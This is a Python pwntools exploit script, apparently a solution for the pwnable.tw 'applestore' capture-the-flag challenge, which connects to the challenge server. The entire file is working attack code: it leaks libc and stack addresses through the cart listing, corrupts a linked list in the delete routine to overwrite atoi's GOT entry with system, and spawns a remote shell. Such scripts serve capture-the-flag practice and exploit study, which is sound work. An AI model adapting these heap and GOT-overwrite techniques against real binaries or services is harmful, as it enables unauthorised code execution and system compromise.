#!/usr/bin/env python3

from pwn import *

libc = ELF("libc.so.6")
ld = ELF("./ld-2.23.so")

#p = gdb.debug('./applestore_patched', gdbscript='''
#b main
#b delete
#continue
#''')
#p = process('./applestore_patched')
p = remote('chall.pwnable.tw', 10104)

puts_GOT = 0x0804b028 
puts_offset = libc.symbols["puts"]
system_offset = libc.symbols["system"]
environ_offset = libc.symbols["environ"]
sh_str_offset = next(libc.search(b"/bin/sh"))
libc_base = None
stack_frame_base = None       # saved ebp of any add, delete, cart, checkout frame called by handler


def add_item(item):
	p.sendlineafter(b'> ', b'2')
	p.sendlineafter(b'Device Number> ', item)

# add 6 x iphone 6 - 199
for i in range (6):
	add_item(b'1')

# add 20 x iphone 6 plus - 299
for i in range(20):
	add_item(b'2')

# checkout (this adds our $1 iphone to myCart linked list on the stack) 
p.sendlineafter(b'> ', b'5')
p.sendlineafter(b'Let me check your cart. ok? (y/n) > ', b'y')

# cart - leak libc
p.sendlineafter(b'> ', b'4')
payload = b'y' + b'\xff' + p32(puts_GOT) + b'\x00\x00\x00\x00'+ b'\x00\x00\x00\x00'+ b'\x00\x00\x00\x00'
p.sendlineafter(b'Let me check your cart. ok? (y/n) > ', payload)
p.recvuntil(b'27: ')
leaked_puts = u32(p.recv(4))

log.success(f"Leak puts: {hex(leaked_puts)}")
libc_base = leaked_puts - puts_offset
log.success(f"libc_base: {hex(libc_base)}")

# cart - leak stack
p.sendlineafter(b'> ', b'4')
payload = b'y' + b'\xff' + p32(libc_base + environ_offset) + b'\x00\x00\x00\x00'+ b'\x00\x00\x00\x00'+ b'\x00\x00\x00\x00'
p.sendlineafter(b'Let me check your cart. ok? (y/n) > ', payload)
p.recvuntil(b'27: ')
leaked_stack = u32(p.recv(4))

log.success(f"Leak stack: {hex(leaked_stack)}")
stack_frame_base = leaked_stack - 0x104
log.success(f"stack frame base: {hex(stack_frame_base)}")

# delete - write primitive
atoi_GOT = 0x0804b040
product_name = 0x0
product_value = 0x0
product_fwd = stack_frame_base - 0xc
product_bkd = atoi_GOT + 0x22
payload = b"27" + p32(product_name) + p32(product_value) + p32(product_fwd) + p32(product_bkd)
p.sendlineafter(b'> ', b'3')
p.sendlineafter(b'Item Number> ', payload)

# pop shell
p.sendlineafter(b'> ', p32(system_offset + libc_base) + b';/bin/sh;')

p.interactive()
